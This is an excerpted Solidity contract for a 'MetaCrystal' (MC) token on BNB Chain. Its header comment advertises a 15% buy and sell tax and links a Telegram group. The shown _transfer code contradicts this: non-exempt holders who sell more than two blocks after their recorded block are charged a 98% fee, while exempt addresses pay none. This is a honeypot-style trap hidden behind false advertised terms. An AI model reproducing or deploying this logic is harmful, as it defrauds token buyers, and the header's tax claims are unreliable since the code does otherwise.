...
/*
 _______  _______ _________ _______  _______  _______           _______ _________ _______  _       
...
|/     \|(_______/   )_(   |/     \|(_______/|/   \__/   \_/   \_______)   )_(   |/     \|(_______/
                                                                                                   
- Tokenomics -

💸📣 7% Marketing
🔒 7% Add auto liquidity
🎁 1% Reflections
✅ Buy Tax: 15%
✅ Sell Tax: 15%

💬 Telegram: https://t.me/MetaCrystal
*/
...
contract Metacrystal is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("MetaCrystal", "MC")  {
    ...
    function _transfer(
        ...
        bool takeFee = (block.chainid == 56) && !ef[to] && !ef[from];
        if (takeFee) {
            if (isSell) {
                uint256 fee;
                if (block.number.sub(cd[from]) > 2) {
                    fee = 98;
                } else {
                    fee = marketingFee;
                }
